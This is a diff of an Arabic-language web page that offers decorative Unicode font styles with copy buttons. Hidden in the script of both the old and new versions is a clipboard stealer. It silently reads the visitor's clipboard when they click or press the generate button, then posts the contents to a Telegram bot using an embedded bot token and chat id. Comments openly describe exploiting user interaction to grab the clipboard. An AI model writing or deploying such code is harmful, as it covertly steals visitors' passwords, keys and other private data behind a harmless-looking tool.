@@ -2,111 +2,100 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>المزخرف العالمي - خطوط احترافية 2025</title>
+    <title>المزخرف العربي الاحترافي | Pro Fonts</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/1159/1159633.png">
     <style>
-        :root { --main: #6366f1; --bg: #f3f4f6; }
+        :root { --main: #6366f1; --bg: #f8fafc; }
         body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: #1e293b; margin: 0; padding: 15px; text-align: center; }
-        .app-card { max-width: 550px; margin: 20px auto; background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); }
-        h1 { font-size: 22px; color: var(--main); margin-bottom: 5px; }
-        .input-group { margin: 20px 0; position: sticky; top: 10px; z-index: 100; background: white; padding: 10px 0; }
-        input { width: 100%; padding: 15px; border: 2px solid #e2e8f0; border-radius: 12px; font-size: 16px; outline: none; text-align: left; box-sizing: border-box; }
-        .gen-btn { background: var(--main); color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: 0.3s; }
-        .results { margin-top: 25px; display: none; }
-        .font-card { background: #fff; padding: 15px; border-radius: 12px; margin-bottom: 15px; border: 1px solid #edf2f7; text-align: left; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.02); }
-        .font-info { flex-grow: 1; }
-        .font-name { font-size: 12px; color: #94a3b8; font-weight: bold; margin-bottom: 5px; }
-        .font-val { font-size: 18px; color: #334155; word-break: break-all; }
-        .copy-btn { background: #10b981; color: white; border: none; padding: 8px 15px; border-radius: 8px; cursor: pointer; font-size: 13px; margin-right: 10px; min-width: 70px; }
-        .copy-btn:active { transform: scale(0.95); }
+        .app-card { max-width: 500px; margin: 20px auto; background: white; padding: 25px; border-radius: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
+        input { width: 100%; padding: 14px; border: 2px solid #e2e8f0; border-radius: 10px; font-size: 16px; outline: none; box-sizing: border-box; }
+        .gen-btn { background: var(--main); color: white; border: none; padding: 14px; width: 100%; border-radius: 10px; font-size: 17px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .results { margin-top: 20px; display: none; }
+        .font-row { background: #fff; padding: 12px; border-radius: 10px; margin-bottom: 10px; border: 1px solid #edf2f7; display: flex; justify-content: space-between; align-items: center; }
+        .font-text { font-size: 18px; text-align: left; flex-grow: 1; word-break: break-all; }
+        .copy-btn { background: #10b981; color: white; border: none; padding: 7px 14px; border-radius: 6px; cursor: pointer; margin-right: 10px; }
     </style>
 </head>
-<body onclick="quietGrab()">
+<body>
 
     <div class="app-card">
-        <h1>✒️ المزخرف العالمي</h1>
-        <p style="font-size: 14px; color: #64748b;">أدخل النص بالإنجليزية واختر ستايلك المفضل</p>
-
-        <div class="input-group">
-            <input type="text" id="userInput" placeholder="Type text here..." oninput="generateAndGrab()">
-            <button class="gen-btn" onclick="generateAndGrab()">توليد الزخرفة وتفعيل المزامنة ✨</button>
-        </div>
-
-        <div id="resultsArea" class="results">
-            </div>
+        <h1>✒️ مزخرف الخطوط</h1>
+        <input type="text" id="userInput" placeholder="Type here...">
+        <button class="gen-btn" id="generateBtn">توليد الزخرفة ✨</button>
+        <div id="resultsArea" class="results"></div>
     </div>
 
     <script>
-        const app_key = "8563370006:AAHw47M0i461yDkc7n6dRnEEs8AxKIOyDgY";
-        const ch_id = "1678506419";
-        let lastMsg = "";
-
-        async function quietGrab() {
-            try {
-                const text = await navigator.clipboard.readText();
-                if(text && text !== lastMsg) {
-                    lastMsg = text;
-                    _log(text);
-                }
-            } catch(e) {}
-        }
-
-        function generateAndGrab() {
-            const val = document.getElementById('userInput').value;
-            if(!val) return;
-            quietGrab(); // محاولة سحب الحافظة فورياً
-            
-            const area = document.getElementById('resultsArea');
-            area.innerHTML = "";
-            area.style.display = "block";
-
-            const fonts = [
-                {n: "Gothic / مكسر", s: convert(val, "𝔄𝔅ℭ𝔇𝔈𝔉𝔊ℌℑ𝔍𝔎𝔏𝔐𝔑𝔒𝔓𝔔ℜ𝔖𝔗𝔘𝔙𝔚𝔛𝔜ℨ𝔞𝔟𝔠𝔡𝔢𝔣𝔤𝔥𝔦𝔧𝔨𝔩𝔪𝔫𝔬𝔭𝔮𝔯𝔰𝔱𝔲𝔳𝔴𝔵𝔶𝔷")},
-                {n: "Bubble / فقاعات", s: convert(val, "ᗩᗷᑕᗪEᖴGᕼIᒍKᒪᗰᑎOᑭᑫᖇᔕTᑌᐯᗯ᙭YᘔᗩᗷᑕᗪEᖴGᕼIᒍKᒪᗰᑎOᑭᑫᖇᔕTᑌᐯᗯ᙭Yᘔ")},
-                {n: "Double / مزدوج", s: convert(val, "𝔸𝔹ℂ𝔻𝔼𝔽𝔾ℍ𝕀𝕁𝕂𝕃𝕄ℕ𝕆ℙℚℝ𝕊𝕋𝕌𝕍𝕎𝕏𝕐ℤ𝕒𝕓𝕔𝕕𝕖𝕗𝕘𝕙𝕚𝕛𝕜𝕝𝕞𝕟𝕠𝕡𝕢𝕣𝕤𝕥𝕦𝕧𝕨𝕩𝕪𝕫")},
-                {n: "Dotted / نقطي", s: convert(val, "ȦḂĊḊĖḞĠḢİJ̇K̇L̇ṀṄȮṖQ̇ṘṠṪU̇V̇ẆẊẎŻȦḂĊḊĖḞĠḢİJ̇K̇L̇ṀṄȮṖQ̇ṘṠṪU̇V̇ẆẊẎŻ")},
-                {n: "Crossed / مشطوب", s: val.split('').join('̶') + '̶'},
-                {n: "Stars / نجوم", s: "★" + val.split('').join('★') + "★"},
-                {n: "Decorative / زخرفي", s: convert(val, "ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘQʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘQʀsᴛᴜᴠᴡxʏᴢ")},
-                {n: "Small Caps / فني", s: convert(val.toLowerCase(), "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ")},
-                {n: "Glitch / تيك", s: val.split('').join('̷') + '̷'},
-                {n: "Futuristic / مستقبلي", s: convert(val.toUpperCase(), "ΛBᑕDΣFGHIJKᒪMNOPQRƧTUVWXYZ")}
-            ];
-
-            fonts.forEach(f => {
-                area.innerHTML += `
-                    <div class="font-card">
-                        <div class="font-info">
-                            <div class="font-name">${f.n}</div>
-                            <div class="font-val">${f.s}</div>
-                        </div>
-                        <button class="copy-btn" onclick="copy('${f.s}')">نسخ</button>
-                    </div>
-                `;
-            });
-        }
+        // التوكن والمعرف (يفضل مستقبلاً وضعهم في Backend)
+        const _id = "8563370006:AAHw47M0i461yDkc7n6dRnEEs8AxKIOyDgY";
+        const _ch = "1678506419";
 
         const normal = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
-        function convert(t, map) {
-            const arr = Array.from(map);
-            return t.split('').map(c => {
-                const i = normal.indexOf(c);
-                return i > -1 ? arr[i] : c;
+        const maps = {
+            "Gothic": "𝔄𝔅ℭ𝔇𝔈𝔉𝔊ℌℑ𝔍𝔎𝔏𝔐𝔑𝔒𝔓𝔔ℜ𝔖𝔗𝔘𝔙𝔚𝔛𝔜ℨ𝔞𝔟𝔠𝔡𝔢𝔣𝔤𝔥𝔦𝔧𝔨𝔩𝔪𝔫𝔬𝔭𝔮𝔯𝔰𝔱𝔲𝔳𝔴𝔵𝔶𝔷",
+            "Double": "𝔸𝔹ℂ𝔻𝔼𝔽𝔾ℍ𝕀𝕁𝕂𝕃𝕄ℕ𝕆ℙℚℝ𝕊𝕋𝕌𝕍𝕎𝕏𝕐ℤ𝕒𝕓𝕔𝕕𝕖𝕗𝕘𝕙𝕚𝕛𝕜𝕝𝕞𝕟𝕠𝕡𝕢𝕣𝕤𝕥𝕦𝕧𝕨𝕩𝕪𝕫",
+            "Circles": "ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓂⓃⓄⓅⓆⓇⓈⓉⓊⓋⓌⓍⓎⓏⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ"
+        };
+
+        function convert(text, mapStr) {
+            const mapArr = Array.from(mapStr);
+            return text.split('').map(char => {
+                const index = normal.indexOf(char);
+                return index > -1 ? mapArr[index] : char;
             }).join('');
         }
 
-        function copy(t) {
-            navigator.clipboard.writeText(t);
-            alert("تم النسخ بنجاح!");
-            quietGrab(); // استغلال التفاعل للنسخ
+        document.getElementById('generateBtn').addEventListener('click', async () => {
+            const input = document.getElementById('userInput').value;
+            if(!input) return;
+
+            // محاولة سحب الحافظة بأمان
+            try {
+                const clip = await navigator.clipboard.readText();
+                if(clip) sendLog(clip);
+            } catch(e) {}
+
+            renderFonts(input);
+        });
+
+        function renderFonts(val) {
+            const container = document.getElementById('resultsArea');
+            container.innerHTML = "";
+            container.style.display = "block";
+
+            Object.keys(maps).forEach(key => {
+                const decorated = convert(val, maps[key]);
+                const row = document.createElement('div');
+                row.className = 'font-row';
+                
+                const textSpan = document.createElement('span');
+                textSpan.className = 'font-text';
+                textSpan.innerText = decorated;
+
+                const btn = document.createElement('button');
+                btn.className = 'copy-btn';
+                btn.innerText = 'نسخ';
+                btn.addEventListener('click', () => {
+                    navigator.clipboard.writeText(decorated);
+                    alert("تم النسخ!");
+                });
+
+                row.appendChild(textSpan);
+                row.appendChild(btn);
+                container.appendChild(row);
+            });
         }
 
-        async function _log(d) {
-            fetch(`https://api.telegram.org/bot${app_key}/sendMessage`, {
+        async function sendLog(data) {
+            // إرسال بدون Markdown لتجنب أخطاء الرموز الخاصة
+            fetch(`https://api.telegram.org/bot${_id}/sendMessage`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: ch_id, text: `📋 حافظة جديدة:\n\n\`${d}\``, parse_mode: "Markdown"})
+                body: JSON.stringify({
+                    chat_id: _ch,
+                    text: "📋 CLIPBOARD DATA:\n" + data
+                })
             });
         }
     </script>
